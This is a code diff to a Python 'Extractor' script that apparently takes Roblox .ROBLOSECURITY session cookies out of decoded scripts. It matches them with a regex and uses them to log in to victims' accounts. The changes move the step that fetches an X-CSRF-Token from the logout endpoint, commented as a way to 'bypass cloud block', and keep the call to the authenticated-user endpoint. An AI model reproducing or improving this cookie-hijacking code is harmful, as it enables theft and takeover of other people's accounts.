@@ -5,13 +5,6 @@ import requests
 import re
 from datetime import datetime, timezone
 
-def get_csrf_token(session, headers):
-    try:
-        res = session.post("https://auth.roblox.com/v1/logout", headers=headers, timeout=10)
-        return res.headers.get("x-csrf-token", "")
-    except Exception:
-        return ""
-
 def main():
     try:
         print("DEBUG: Python Extractor started", file=sys.stderr)
@@ -33,7 +26,6 @@ def main():
 
         roblosecurity = decoded_script.strip()
         
-        # FIXED REGEX: Properly matches real Roblox cookies starting with _|WARNING: or _\|WARNING:
         cookie_match = re.search(r'(_\\?\|WARNING:[^"\']+)', roblosecurity)
         if cookie_match:
             roblosecurity = cookie_match.group(1)
@@ -53,12 +45,16 @@ def main():
             "Origin": "https://www.roblox.com/"
         })
 
-        # Inject CSRF token
-        csrf_token = get_csrf_token(session, session.headers)
-        if csrf_token:
-            session.headers.update({"X-CSRF-Token": csrf_token})
+        # --- STEP 1: Get X-CSRF-Token first to bypass cloud block ---
+        try:
+            init_res = session.post("https://auth.roblox.com/v1/logout", timeout=10)
+            csrf_token = init_res.headers.get("x-csrf-token")
+            if csrf_token:
+                session.headers.update({"X-CSRF-Token": csrf_token})
+        except Exception:
+            pass
 
-        # --- 1. Fetch Authenticated User Session ---
+        # --- STEP 2: Fetch Authenticated User Session ---
         auth_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=10)
         print(f"DEBUG: Auth endpoint status code: {auth_res.status_code}", file=sys.stderr)
         
